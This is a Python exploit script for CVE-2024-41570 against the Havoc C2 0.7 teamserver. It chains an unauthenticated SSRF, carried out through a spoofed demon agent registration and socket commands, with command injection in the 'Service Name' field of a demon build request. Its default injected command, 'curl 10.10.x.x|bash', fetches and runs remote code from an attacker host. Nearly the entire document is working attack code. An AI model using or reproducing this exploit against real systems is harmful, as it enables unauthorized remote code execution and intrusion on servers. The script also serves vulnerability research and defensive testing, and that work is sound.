#!/usr/bin/env python3
# -*- coding: utf-8 -*-
##
##
## 
"""
Exploit Title: Havoc C2 0.7 Unauthenticated SSRF (CVE-2024-41570)
Date: 2024-07-13
Exploit Author: @_chebuya
Software Link: https://github.com/HavocFramework/Havoc
Version: v0.7
Tested on: Ubuntu 20.04 LTS

Description:
------------
This exploit works by spoofing a "demon" agent registration and checkins
to open a TCP socket on the teamserver and read/write data from it.
This effectively allows attackers to conduct SSRF (Server-Side Request
Forgery) attacks, leak internal information, pivot traffic, etc.

Usage:
------
python3 exploit.py -t <TEAMSERVER_URL> -i <TARGET_IP> -p <TARGET_PORT> [-c <CMD> ...]
"""

import argparse
import base64
import binascii
import hashlib
import json
import os
import random
import requests
import struct
import string
import time
import urllib3

from Crypto.Cipher import AES
from Crypto.Util import Counter

urllib3.disable_warnings()  # Disable insecure request warnings

# --- Constants ---
KEY_BYTES = 32
MAGIC = b"\xde\xad\xbe\xef"  # 0xDEADBEEF
AES_KEY = b"\x00" * 32
AES_IV = b"\x00" * 16

# --- Crypto Functions ---
def decrypt_data(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """
    Decrypt the given ciphertext using AES in CTR mode with the provided key/iv.
    """
    if len(key) <= KEY_BYTES:
        key += b"0" * (KEY_BYTES - len(key))

    assert len(key) == KEY_BYTES, "Key length must be 32 bytes."

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    return aes.decrypt(ciphertext)


def encrypt_data(key: bytes, iv: bytes, plaintext: bytes) -> bytes:
    """
    Encrypt the given plaintext using AES in CTR mode with the provided key/iv.
    """
    if len(key) <= KEY_BYTES:
        key += b"0" * (KEY_BYTES - len(key))

    assert len(key) == KEY_BYTES, "Key length must be 32 bytes."

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)
    return aes.encrypt(plaintext)


def int_to_bytes(value: int, length: int = 4, byteorder: str = "big") -> bytes:
    """
    Convert an integer to bytes, defaulting to 4 bytes in big-endian order.
    """
    return value.to_bytes(length, byteorder)

# --- Exploit Functions ---
def register_demon_agent(
    teamserver_listener_url: str,
    headers: dict,
    agent_id: bytes,
    hostname: bytes,
    username: bytes,
    domain_name: bytes,
    internal_ip: bytes,
    process_name: bytes,
    process_id: bytes
) -> None:
    """
    Spoof a demon agent registration on the Havoc teamserver.
    """
    print("[***] Trying to register agent...")

    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    # Additional random data appended
    data = b"\xab" * 100

    header_data = (
        command
        + request_id
        + AES_KEY
        + AES_IV
        + demon_id
        + hostname_length
        + hostname
        + username_length
        + username
        + domain_name_length
        + domain_name
        + internal_ip_length
        + internal_ip
        + process_name_length
        + process_name
        + process_id
        + data
    )

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, "big")
    agent_header = size_bytes + MAGIC + agent_id

    r = requests.post(
        teamserver_listener_url,
        data=agent_header + header_data,
        headers=headers,
        verify=False,
    )
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")


def open_teamserver_socket(
    teamserver_listener_url: str,
    headers: dict,
    agent_id: bytes,
    socket_id: bytes,
    target_address: str,
    target_port: int,
) -> None:
    """
    Open a TCP socket on the Havoc teamserver to target_address:target_port.
    """
    print("[***] Trying to open socket on the teamserver...")

    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"

    # Not used, but present for structure
    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"

    # Reverse the IP octets
    forward_addr = b"".join(
        int_to_bytes(int(octet), length=1)
        for octet in target_address.split(".")[::-1]
    )
    forward_port = int_to_bytes(target_port)

    package = subcommand + socket_id + local_addr + local_port + forward_addr + forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt_data(AES_KEY, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, "big")
    agent_header = size_bytes + MAGIC + agent_id
    data = agent_header + header_data

    r = requests.post(
        teamserver_listener_url,
        data=data,
        headers=headers,
        verify=False,
    )
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")


def send_to_socket(
    teamserver_listener_url: str,
    headers: dict,
    agent_id: bytes,
    socket_id: bytes,
    data: bytes,
) -> None:
    """
    Write (send) data to the open socket on the teamserver.
    """
    print("[***] Trying to write to the socket")

    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11
    subcommand = b"\x00\x00\x00\x11"
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"
    data_length = int_to_bytes(len(data))

    package = subcommand + socket_id + socket_type + success + data_length + data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt_data(AES_KEY, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, "big")
    agent_header = size_bytes + MAGIC + agent_id
    post_data = agent_header + header_data

    r = requests.post(
        teamserver_listener_url,
        data=post_data,
        headers=headers,
        verify=False,
    )
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")


def receive_from_socket(
    teamserver_listener_url: str,
    headers: dict,
    agent_id: bytes,
) -> bytes:
    """
    Read (receive) data from the open socket on the teamserver.
    Returns the decrypted data payload.
    """
    print("[***] Trying to poll teamserver for socket output...")

    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"
    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, "big")
    agent_header = size_bytes + MAGIC + agent_id
    data = agent_header + header_data

    r = requests.post(
        teamserver_listener_url,
        data=data,
        headers=headers,
        verify=False,
    )
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
        print(r.content)
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return b""

    command_id = int.from_bytes(r.content[0:4], "little")
    req_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    # Skip 12 bytes after decryption (as in original code)
    return decrypt_data(AES_KEY, AES_IV, enc_package)[12:]


def build_websocket_frame(message: str) -> bytes:
    """
    Create a masked WebSocket frame for the given message (text frame).
    """
    message_bytes = message.encode()
    payload_length = len(message_bytes)

    fin = 1        # FIN bit -> final frame
    opcode = 0x1   # Text frame opcode
    fin_and_opcode = (fin << 7) | opcode

    if payload_length <= 125:
        payload_len_field = payload_length
        extended_payload = b""
    elif payload_length <= 65535:
        payload_len_field = 126
        extended_payload = struct.pack("!H", payload_length)
    else:
        payload_len_field = 127
        extended_payload = struct.pack("!Q", payload_length)

    # Masking key + masked payload
    masking_key = os.urandom(4)
    masked_payload = bytes(b ^ masking_key[i % 4] for i, b in enumerate(message_bytes))

    # Build frame
    frame = struct.pack("!B", fin_and_opcode)      # FIN + opcode
    frame += struct.pack("!B", (1 << 7) | payload_len_field)
    frame += extended_payload
    frame += masking_key
    frame += masked_payload

    return frame


def main():
    parser = argparse.ArgumentParser(
        description="Havoc C2 0.7 Unauthenticated SSRF Exploit (CVE-2024-41570)"
    )
    parser.add_argument(
        "-t", "--target",
        help="The listener (teamserver) target in URL format",
        required=True
    )
    parser.add_argument(
        "-i", "--ip",
        help="The IP address to open the socket with",
        required=True
    )
    parser.add_argument(
        "-p", "--port",
        help="The port to open the socket with",
        required=True
    )
    parser.add_argument(
        "-A", "--user-agent",
        help="The User-Agent string for the spoofed agent",
        default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    )
    parser.add_argument(
        "-H", "--hostname",
        help="The hostname for the spoofed agent",
        default="DESKTOP-7F61JT1"
    )
    parser.add_argument(
        "-u", "--username",
        help="The username for the spoofed agent",
        default="Administrator"
    )
    parser.add_argument(
        "-d", "--domain-name",
        help="The domain name for the spoofed agent",
        default="ECORP"
    )
    parser.add_argument(
        "-n", "--process-name",
        help="The process name for the spoofed agent",
        default="msedge.exe"
    )
    parser.add_argument(
        "-ip", "--internal-ip",
        help="The internal IP for the spoofed agent",
        default="10.1.33.7"
    )
    parser.add_argument(
        "--path",
        help="Optional path for the HTTP request",
        required=False
    )
    parser.add_argument(
        "-c", "--cmd",
        help="The command to inject",
        required=False,
        default="curl 10.10.x.x|bash"
    )

    args = parser.parse_args()

    # Prepare everything
    headers = {"User-Agent": args.user_agent}
    agent_id = int_to_bytes(random.randint(100000, 1000000))

    # Convert certain args to bytes for usage
    hostname_bytes = args.hostname.encode("utf-8")
    username_bytes = args.username.encode("utf-8")
    domain_name_bytes = args.domain_name.encode("utf-8")
    internal_ip_bytes = args.internal_ip.encode("utf-8")
    process_name_bytes = args.process_name.encode("utf-16le")
    process_id = int_to_bytes(random.randint(1000, 5000))

    # 1. Register a fake demon agent
    register_demon_agent(
        teamserver_listener_url=args.target,
        headers=headers,
        agent_id=agent_id,
        hostname=hostname_bytes,
        username=username_bytes,
        domain_name=domain_name_bytes,
        internal_ip=internal_ip_bytes,
        process_name=process_name_bytes,
        process_id=process_id
    )

    # 2. Open a TCP socket on the teamserver
    socket_id = b"\x11\x11\x11\x11"
    open_teamserver_socket(
        teamserver_listener_url=args.target,
        headers=headers,
        agent_id=agent_id,
        socket_id=socket_id,
        target_address=args.ip,
        target_port=int(args.port),
    )

    # 3. Build a WebSocket handshake request
    key = "Y3jLIkpDu4GKI8cWQwKoeA=="
    websocket_handshake = (
        "GET /havoc/ HTTP/1.1\r\n"
        f"Host: {args.ip}:{args.port}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-Websocket-Protocol: echo-protocol\r\n"
        "Sec-WebSocket-Version: 13\r\n\r\n"
    )
    request_data = websocket_handshake.encode()

    # 4. Send the WS handshake, read response
    send_to_socket(args.target, headers, agent_id, socket_id, request_data)
    print(receive_from_socket(args.target, headers, agent_id))

    # 5. Send Auth payload
    auth_payload = {
        "Body": {
            "Info": {
                "Password": hashlib.sha3_256("axxxxzxxxxzxxxxxxxxxxxz".encode()).hexdigest(),
                "User": "xxxxxxxxxx"
            },
            "SubEvent": 3
        },
        "Head": {
            "Event": 1,
            "OneTime": "",
            "Time": "18:40:17",
            "User": "xxxx"
        }
    }
    print(f"Sending Auth Payload: {json.dumps(auth_payload)}")
    auth_frame = build_websocket_frame(json.dumps(auth_payload))
    send_to_socket(args.target, headers, agent_id, socket_id, auth_frame)
    print(f"Received: {receive_from_socket(args.target, headers, agent_id)}")

    # 6. Sleep briefly
    time.sleep(3)

    # 7. Command injection payload
    cmd = args.cmd
    injection = f""" \\\\\\\" -mbla; {cmd} 1>&2 && false #"""

    # 8. Build final demon compilation payload
    demon_payload = {
        "Body": {
            "Info": {
                "AgentType": "Demon",
                "Arch": "x64",
                "Config": "{\n"
                          "    \"Amsi/Etw Patch\": \"None\",\n"
                          "    \"Indirect Syscall\": false,\n"
                          "    \"Injection\": {\n"
                          "        \"Alloc\": \"Native/Syscall\",\n"
                          "        \"Execute\": \"Native/Syscall\",\n"
                          "        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n"
                          "        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n"
                          "    },\n"
                          "    \"Jitter\": \"0\",\n"
                          "    \"Proxy Loading\": \"None (LdrLoadDll)\",\n"
                          f"    \"Service Name\":\"{injection}\",\n"
                          "    \"Sleep\": \"2\",\n"
                          "    \"Sleep Jmp Gadget\": \"None\",\n"
                          "    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n"
                          "    \"Stack Duplication\": false\n"
                          "}\n",
                "Format": "Windows Service Exe",
                "Listener": "Demon Listener"
            },
            "SubEvent": 2
        },
        "Head": {
            "Event": 5,
            "OneTime": "true",
            "Time": "18:39:04",
            "User": "xxxxx"
        }
    }

    demon_frame = build_websocket_frame(json.dumps(demon_payload))
    send_to_socket(args.target, headers, agent_id, socket_id, demon_frame)

    print("[+] Exploit completed!")

if __name__ == "__main__":
    main()
